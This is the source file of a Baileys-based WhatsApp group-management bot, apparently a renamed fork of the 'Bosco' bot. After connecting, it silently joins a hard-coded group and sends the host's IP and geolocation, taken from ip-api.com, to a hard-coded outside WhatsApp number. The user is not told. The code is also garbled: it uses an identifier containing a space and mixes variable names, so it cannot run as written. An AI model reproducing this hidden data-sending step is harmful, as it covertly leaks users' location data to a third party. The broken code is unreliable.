/* 
Don't change credits🥲🚶
Sourcecode https://github.com/pepesir/Bosco
Want to recode? yes, it's up to you as long as you don't change the watermark
Don't sell the SC 😐👌
*/

const {
WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
   processTicksAndRejections,
   ECONNABORTED,
   apikey,
   WA_DEAFULT_EPHEMERAL,
   DataView,
   TypedArray,
   device,
   Browser
} = require('@adiwajshing/baileys')
const { color, bgcolor } = require('./lib/color')
const fs = require("fs-extra")
const figlet = require('figlet')
const clc = require('chalk')
const { sleep, start, success } = require('./lib/myfunc')
const { uncache, nocache } = require('./lib/loader')
const setting = JSON.parse(fs.readFileSync('./setting.json'))
const welcome = require('./message/group')
const fetch = require("node-fetch");
const { getBuffer } = require('./lib/myfunc')
baterai = 'unknown'
charging = 'unknown'


require('./ACHU SER.js')
nocache('../ACHU SER.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
require('./message/help.js')
nocache('../message/help.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
         
    const starts = async (ACHU SER = new WAConnection()) => {
	ACHU SER.logger.level = 'warn'
	console.log(color(figlet.textSync('ACHU SER BY ACHU SER', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'yellow'))
	console.log(color('[ACHU SER]', 'cyan'), color('WELCOME', 'white'))
	console.log(color('[SER]', 'cyan'), color('BOT RUNNING', 'yellow'))
	bosco.browserDescription = ["SUBSCRIBE YT - [PEPE - SIR]", "firefox", "3.0.0"];

	// Menunggu QR
	ACHU SER.on('qr', () => {
		console.log(color('[', 'white'), color('!', 'red'), color(']', 'white'), color('Please scan qr code'))
	})

	// Menghubungkan
	fs.existsSync(`./ACHU SER.json`) && ACHU SER.loadAuthInfo(`./ACHU SER.json`)
	ACHU SER.on('connecting', () => {
		start('2', 'Connecting...','red')
	})

	//connect
	ACHU SER.on('open', () => {
		success('2', 'Connected')
	})

	// session
	await ACHU SER.connect({
		timeoutMs: 10 * 1000
	})
	fs.writeFileSync(`./ACHU SER.json`, JSON.stringify(ACHU SER.base64EncodedAuthInfo(), null, '\t'));
 teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
 ACHU SER.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
 ACHU SER.sendMessage(`${setting.owner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 , 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(ACHU SER.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 pepe ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       ACHU SER.sendMessage("17247805970@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer pepe ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
   })

	// Baterai
	ACHU SER.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
		console.log(json[2][0][1])
		console.log('Battery : ' + batterylevel + '%')
	})
	global.batrei = global.batrei ? global.batrei : []
	ACHU SER.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
	})
	
	  // Call Block
	/*ACHU SER.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        console.log("caller "+ callerId)
        ACHU SER.sendMessage(callerId, "Call = BLOCK!!\nDont call me!!", MessageType.text)
        await sleep(3000)
        await ACHU SER.blockUser(callerId, "add") // Block user
   })*/
   
   ACHU SER.on('message-delete', async (m) => {
   	await m(m)
   })
  
       // welcome
	ACHU SER.on('group-participants-update', async (anu) => {
		await welcome(bosco, anu)
		try { 
           const mdata = await bosco.groupMetadata(anu.jid)
           console.log(anu)
		if (anu.action == 'promote'){
			num = anu.participants[0]
			try {
					ppimg = await ACHU SER.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let buff = await getBuffer(ppimg)
			const bosco1 = await ACHU SER.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
			const bosco2 = bosco1.message["ephemeralMessage"] ? ACHU SER1.message.ephemeralMessage : ACHU SER1
			teks = `*Yᴏᴜ Aʀᴇ Nᴏᴡ Aɴ Aᴅᴍɪɴ*
 @${num.split('@')[0]}
`
			promoteBut = [{buttonId:`hm`,buttonText:{displayText:'Congrats 🥳'},type:1}]
            promoteButt = { contentText: `${teks}`, footerText: `Thank You So Much 🌝❤️`, buttons: promoteBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
            ACHU SER.sendMessage(mdata.id, promoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
		    } else if (anu.action == 'demote') {
			num = anu.participants[0]
			const mdata = await ACHU SER.groupMetadata(anu.jid)
			try {
					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let buff = await getBuffer(ppimg)
			const ACHU SER3= await ACHU SER.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
			const ACHU SER4 = ACHU SER3.message["ephemeralMessage"] ? ACHU SER3.message.ephemeralMessage : bosco3
			teks = `*Yᴏᴜ Aʀᴇ Nᴏ Lᴏɴɢᴇʀ Aɴ Aᴅᴍɪɴ*
 @${num.split('@')[0]}
`
			demoteBut = [{buttonId:`hm`,buttonText:{displayText:'Next Time I get'},type:1}]
            demoteButt = { contentText: `${teks}`, footerText: `Who Is the Bledy Fool 🙂`, buttons: demoteBut, headerType: 6, locationMessage: bosco4.message.locationMessage}
            ACHU SER.sendMessage(mdata.id, demoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
		    }
            } catch (e) {
         console.log('Error : %s', color(e, 'red'))
      }
})

    ACHU SER.on('group-update', async (anu) => {
    falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
   remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "Alphabot", "caption": `🌹 𝑷 𝑬 𝑷 𝑬 - 𝑺 𝑬 𝑹 🌹`, 'jpegThumbnail': fs.readFileSync(`ds.jpg`)}}}
    metdata = await bosco.groupMetadata(anu.jid)
    if(anu.announce == 'false'){
    teks = `*[ Gʀᴏᴜᴘ Oᴘᴇɴᴇᴅ ]*\n`
    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
  } else if(anu.announce == 'true'){
    teks = `*[ Gʀᴏᴜᴘ Cʟᴏsᴇᴅ ]*\n`
    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
  } else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `*[ Gʀᴏᴜᴘ Dɪsᴄʀɪᴘᴛɪᴏɴ Cʜᴀɴɢᴇ ]*\n\n • *ɴᴇᴡ* : *${anu.desc}*`
    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
    console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
 } else if(anu.restrict == 'false'){
    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢs Cʜᴀɴɢᴇ ]*\n`
    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
  } else if(anu.restrict == 'true'){
    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢ Cʜᴀɴɢᴇ ]*\n`
    ACHU SER.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
   }
})

    
	.on('chat-update', async (message) => {
		require('./ACHU SER.js')(ACHU SER, message)
	})
}

starts()
